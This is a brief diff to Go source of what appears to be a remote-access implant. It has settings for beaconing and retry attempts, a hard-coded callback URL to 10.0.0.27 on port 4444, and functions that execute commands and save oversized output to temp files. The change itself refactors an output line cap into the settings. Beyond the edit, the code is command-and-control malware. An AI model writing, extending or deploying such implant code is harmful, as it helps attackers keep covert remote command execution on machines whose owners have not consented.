@@ -27,6 +27,7 @@ func init_settings() {
         "urls":make([]string, 1),
         "attempts":"3",
         "beacon":"10",
+        "line_cap":"100",
         "debug":"true",
     }
     urls := []string{"https://10.0.0.27:4444/index.php?id=1"}
@@ -139,10 +140,9 @@ func execute_raw(c string, args []string) ([]byte){
 }
 
 func execute(c string, args []string){
-    line_cap := 100
     out := execute_raw(c, args)
     str_out := string(out)
-    if strings.Count(str_out, "\n") > line_cap {
+    if strings.Count(str_out, "\n") > atoi(SETTINGS["line_cap"].(string)) {
         tmp, _ := ioutil.TempFile("", "")
         defer os.Remove(tmp.Name())
         ioutil.WriteFile(tmp.Name(), out, 0644)
